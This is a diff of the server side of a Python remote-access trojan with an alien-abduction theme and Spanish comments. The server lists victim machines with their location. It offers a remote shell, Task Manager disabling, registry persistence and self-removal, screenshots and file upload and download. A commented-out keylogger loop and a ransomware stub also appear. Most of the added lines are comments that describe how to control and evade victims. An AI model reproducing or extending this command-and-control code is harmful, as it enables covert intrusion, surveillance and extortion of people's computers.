@@ -31,6 +31,7 @@ from utilidades.cadenas import chain_alien
 EnVivo=False
 
 
+# CARGAR MUSICAS
 def cargar_banda_sonora(musica):
 	pygame.mixer.music.load(os.getcwd() + musica)
 	pygame.mixer.music.play(loops=-1)
@@ -45,6 +46,7 @@ def cartelAyuda():
 	""")
 	return
 
+# BANNERS PARA CADA MENU
 def encabezados(banner):
 	os.system('clear')
 	if banner=="principal":
@@ -60,7 +62,7 @@ def encabezados(banner):
 	cartelAyuda()
 	return
 
-
+# DESPLIEGA AYUDA ESPECIFICA EN CADA SECCION DEL PROGRAMA
 def desplegar_ayuda(COMANDOS,tipo):
 	if tipo=="principal":
 		ayuda.comandos(COMANDOS,"Comandos generales")
@@ -83,6 +85,7 @@ def desplegar_ayuda(COMANDOS,tipo):
 	return
 
 
+# FRASES AL MATAR UNA MAQUINA VICTIMA 
 def ataques():
 
 	import random
@@ -101,6 +104,7 @@ def ataques():
 	return random.choice(frases)
 
 
+# VER AHORA
 def control_ruta(path,signo):
 		
 	ruta = path.split(signo)
@@ -116,7 +120,6 @@ def control_ruta(path,signo):
 
 
 # ------------------------------------------------------------------------------------------
-
 
 
 class Server(Thread):
@@ -140,8 +143,9 @@ class Server(Thread):
 			self.server.listen(5)
 
 		except socket.error as e:
-			print (" Error: ",e)
-
+			print (" Error: ", e)
+			input (" Presione una tecla para continuar...")
+			sys.exit(0)
 
 
 	#def cifrar(self,msg,BLOCK_SIZE=32):
@@ -149,6 +153,10 @@ class Server(Thread):
 	#	obj = AES.new('This is a key123', AES.MODE_CBC, iv)
 	#    ciphertext = obj.encrypt(message)
 	#    return ciphertext
+
+
+	# PARA CADA FUNCION QUE EJERCERA EL SERVIDOR SE LE DEBERA PASAR COMO PARAMETRO
+	# LA CONEXION DE LA MAQUINA OBJETIVO A LA QUE SE DESEA ENVIAR INFORMACION
 
 
 	# --------- ENVIAR MENSAJES ---------
@@ -178,11 +186,13 @@ class Server(Thread):
 
 		print ("\n"+completo+"\n")
 	
-
 		return True
 
 
 	# --------- OBTENER INFORMACION --------- 
+
+	## Para obtener la informacion, se le pasa como parametro la conexion 
+	## y la lista con direccion IP con puerto cliente.
 
 	def obtener_informacion(self,client,address):
 		hostname = self.recibir(client)
@@ -201,6 +211,10 @@ class Server(Thread):
 
 	# --------- ESCRIBIR INFORMACION --------- 
 
+	## Escribe la informacion del cliente que se capturo en el proceso de escucha
+	## y lo almacena en un archivo, para luego ser utilizado en el modo "Abduccion en Vivo".
+    ## Informacion -> hostname, ciudad, estado y pais
+
 	def EscribirInformacion(self,info):
 		inf = "['"+info[2]+"',"+str(info[4])+","+str(info[1][1])+"]\n"
 		with open('core/abducciones/capturados.txt','a+') as archivo:
@@ -209,6 +223,9 @@ class Server(Thread):
 
 
 	# --------- ABDUCIR VICTIMAS ---------
+
+	## Al comenzar el servidor, se creara un hilo que pondra al servidor en escucha
+	## para que los clientes se conecten al mismo.
 
 	def run(self):
 
@@ -226,21 +243,24 @@ class Server(Thread):
 		return
 
 
+	# --------- VER EN VIVO ---------
+
+	## Permite ver como los clientes se conectan al servidor. Para esto, recurre al
+	## archivo donde se escribio toda la informacion de cada cliente.
+
 	def VerAbducciones(self):
 		# -hold en xterm es para que la ventana quede estatica y no se cierre al terminar el programa
 		os.system('xterm -fg white -bg black -geometry 93x31+0+100 -title "Abduccion en vivo" -e python3 core/abducciones/live.py &')
 		return
 
 
+
 	# --------- LISTAR VICTIMAS ---------
 
+	## Genera un listado de todas las maquinas cliente conectadas al servidor.
+	## Como parametro se le pasa el modo en el cual se quiere ver el listado.
+
 	def ver_terricolas(self,modo):
-
-		# ["ID", "Terricola", "Pais", "Ciudad" ]
-		# terricola[2],terricola[4]["country_name"],terricola[4]["city_name"]
-
-		# ["ID", "Terricola", "Pais", "Ciudad", "Sistema Operativo" ,"Direccion IP (Privada)", "IPv4 (Publica)", "Puerto"]
-		# terricola[2],terricola[4]["country_name"],terricola[4]["city_name"],terricola[3],terricola[1][0],terricola[4]["IPv4"],terricola[1][1]
 
 		lista_terricolas_table = []
 
@@ -271,12 +291,18 @@ class Server(Thread):
 
 	# --------- REMOVER REGISTRO DE VICTIMA -------------
 
+	## Elimina la conexion del cliente seleccionado de la lista de conexiones.
+	## Se le pasa como parametro la conexion cliente.
+
 	def remover_terricola(self,client):
 		return self.terricolas.pop(client)	
 
 
 
 	# --------- MATAR A UN SECUESTRADO ESPECIFICO -------------
+
+	## Permite matar la conexion del cliente con el servidor.
+	## Se le pasa como parametro la conexion cliente.
 	
 	def matar_terricola(self,client):
 
@@ -288,6 +314,10 @@ class Server(Thread):
 
 
 	# --------- MATAR A TODAS LAS VICTIMAS CAPTURADAS ---------
+
+	## Permite matar a todas las conexiones cliente con el servidor a partir
+	## de la lista de conexiones. Al terminar el proceso anterior, se limpiara
+	## la lista. Mientras este proceso esta en marcha, emite una frase divertida.
 
 	def matar_terricolas(self):
 
@@ -313,6 +343,11 @@ class Server(Thread):
 
 	# --------- DETENER SERVIDOR ---------
 
+	## Mata todas las conexiones cliente con el servidor y luego vacia la lista.
+	## Es igual al metodo "matar_terricolas" pero esta es exclusiva para cuando
+	## se detenga el servidor y no emita ningun tipo de mensaje. Luego de este
+	## proceso, cierra el socket.
+
 	def destruir_evidencias(self):
 		for terricola in self.terricolas:
 			self.enviar(terricola[0],"matar")
@@ -324,7 +359,6 @@ class Server(Thread):
 
 	def detener(self):
 		self.destruir_evidencias()
-		#self.server.shutdown(socket.SHUT_RDWR)
 		self.server.close()
 		return
 
@@ -332,15 +366,25 @@ class Server(Thread):
 
 # -----------------------------------------------------------------------------------------
 
+
+## Una clase con diferentes metodos para manipular al cliente.
+
 class Control():
+
+	## A esta clase se le pasa como parametros, el servidor que se creo y la 
+	## posicion en la cual se encuentra el cliente a querer controlar
 
 	def __init__(self,servidor,client):
 		self.servidor = servidor
+		# SELF.OBJETIVO ES LA CONEXION CLIENTE SELECCIONADA 
 		self.objetivo = servidor.terricolas[client][0]
 		self.hostname = servidor.terricolas[client][2]
 
 
-	# MODULOS EXTRAS
+	# --------- MODULOS DE CONTROL ---------
+
+	## [SHELL]
+	### Devuelve una shell
 
 	def run_cmd(self):
 		
@@ -386,6 +430,10 @@ class Control():
 		return
 
 
+	## [DESHABILITAR EL ADMINISTRADOR DE TAREAS] -> Solo funciona en Windows
+	### La víctima tratará de librarse de tí, pero no será muy fácil. Podrás 
+	### deshabilitar el administrador de tareas para evitar que el cierre tu actividad en su interior.
+
 	def deshabilitar_TaskManager(self):
 
 		self.servidor.enviar(self.objetivo,"taskManagerDisable")
@@ -399,34 +447,82 @@ class Control():
 		return
 
 
+	## [CREAR CONEXION CON NETCAT]	
+
 	def netcat(self):
 		#servidor.enviar(servidor.terricolas[client][0],"netcat")
 		#os.system('xterm -fg white -bg black -geometry 93x31+0+100 -title "Victima Netcat" -e nc -lp 9001 &')
 		return (" Modulo en desarrollo")
 
+
+	## [ACTIVAR PERSISTENCIA] -> Solo funciona en Windows	
+	### Podras copiarte en los registros del sistema para obtener persistencia.
+
 	def persistencia(self):
 
+		# Envia modo persistencia
+		print (" [\033[1;34m*\033[0;39m] Enviando ordenes al gusano... ")
+		time.sleep(1)
 		self.servidor.enviar(self.objetivo,"persistencia")
+		time.sleep(1.5)
+		print (" [\033[1;34m*\033[0;39m] Intentando obtener persistencia... ")
 		msg = self.servidor.recibir(self.objetivo)
+		time.sleep(2)
 		print (msg)
 		return
 
+
+	## [REMOVER PERSISTENCIA] -> Solo funciona en Windows	
+	### Una vez que hayas acabado con la víctima, puedes 
+	### eliminar todo tipo de rastro del bicho implantado en el sistema.
 
 	def autoremoverse(self):
 
+		print (" [\033[1;34m*\033[0;39m] Enviando ordenes al gusano... ")
+		time.sleep(1)
 		self.servidor.enviar(self.objetivo,"autoremover")
+		time.sleep(1.5)
+		print (" [\033[1;34m*\033[0;39m] Intentando autoremoverse del cerebro victima... ")
 		msg = self.servidor.recibir(self.objetivo)
-		print (msg)
+		time.sleep(2)
+		print (" [\033[1;32m+\033[0;39m] "+msg)
 		return
 
 
-	def keylogger(self):
+	## [KEYLOGGER]	
+	### Graba cualquier movimiento que la víctima haga mediante pulsaciones en el teclado. 
+	### Toda la información se registrará en un archivo.
+
+	# def keylogger(self):
 		
-		#self.servidor.enviar(self.objetivo,"keylogger")
-		#msg = self.servidor.recibir(self.objetivo)
-		#print (msg)
-		return
+	# 	self.servidor.enviar(self.objetivo,"keylogger")
 
+	# 	from pynput.keyboard import Key
+
+	# 	archivo = open("key_log.txt","a")
+
+	# 	print (" [\033[1;34m*\033[0;39m] Keylogger en escucha...")
+
+	# 	try:
+	# 		while (True):
+	# 			key = self.servidor.recibir(self.objetivo)
+	# 			self.servidor.enviar(self.objetivo,"ok")
+	# 			archivo.write(key)
+	# 			print (key)
+	# 	except KeyboardInterrupt:
+	# 		self.servidor.enviar(self.objetivo,"detener")
+	# 		self.servidor.recibir(self.objetivo)
+	# 		time.sleep(0.01)
+	# 		archivo.close()
+	# 		print (" [\033[1;32m+\033[0;39m] Registro de teclas guardado en: key_log.txt")
+	# 		return
+
+	# 	return
+
+
+	## [SCREENSHOT]	
+	### Si quieres pruebas de que la víctima no te engaña, 
+	### toma capturas de pantalla para corroborar sus acciones.
 
 	def screenshot(self):
 
@@ -462,13 +558,30 @@ class Control():
 		return
 
 
+	## [GRABAR AUDIO]	
+	### Si quieres mantenerte informado de lo que sucede alrededor 
+	### del capturado, entonces activa este módulo, para escuchar 
+	### todos sus movimientos.
+
 	def grabarAudio(self):
 		return
 
 
+	## [RANSOMWARE]
+	### Si la víctima se resiste a darte lo que quieres, sólo toma 
+	### de rehénes a sus personas más cercanas. Entonces podrás pedir 
+	### lo que quieras a cambio de liberarlas. (Se recomienda usar 
+	### este módulo en un entorno controlado).
+
 	def ransomware(self):
 		return
 
+
+
+	## [SUBIR Y DESCARGAR ARCHIVOS]
+	### Claramente como lo dice el subtitulo, podrás subir cualquier archivo 
+	### de tú máquina al del equipo víctima. Igualmente vas a poder descargar
+	### cualquier archivo del secuestrado.
 
 	def subir_archivos(self,subida):
 
@@ -673,6 +786,8 @@ class Control():
 
 def manipular(servidor,cliente):
 
+	# "keylogger" : ["keylogger","Grabar pulsaciones de teclas de victima"]
+
 	COMANDOS_EXTRA = {
 
 	"cmd" : ["shell","Ejecutar shell"],
@@ -729,8 +844,8 @@ def manipular(servidor,cliente):
 			control.netcat()
 			encabezados('manipular')
 
-		#elif (victima=="keylogger"):
-		#	control.keylogger()
+		# elif (victima=="keylogger"):
+		# 	control.keylogger()
 
 		elif (victima=="persistencia"):
 			control.persistencia()
@@ -772,7 +887,7 @@ def manipular(servidor,cliente):
 		# MODULOS BASICOS
 
 		elif (victima=="ayuda"):
-			ayuda.comandos(COMANDOS_EXTRA,"Comandos extra")
+			ayuda.comandos(COMANDOS_EXTRA,"Comandos core")
 			ayuda.comandos(COMANDOS_ARCHIVOS,"Comandos de archivos")
 			ayuda.comandos(COMANDOS_RED,"Comandos de red")
 			ayuda.comandos(COMANDOS_SISTEMA,"Comandos del sistema")
@@ -822,6 +937,10 @@ def laboratorio(servidor):
 					cliente = int(prompt_laboratorio.replace('manipular', ''))-1
 
 					if (cliente < len(servidor.terricolas)) and (cliente>=0):
+						chain_alien(" \n [\033[1;34m*\033[0;39m] Tomando control sobre el humano...")
+						time.sleep(1.3)
+						chain_alien ("\n [\033[1;32m+\033[0;39m] El cuerpo esta listo para su control.")
+						time.sleep(1.5)
 						manipular(servidor,cliente)
 						encabezados("laboratorio")
 						print ("\n [\033[1;32m+\033[0;39m] Hay " + str(len(servidor.terricolas)) + " terricolas para su control\n")
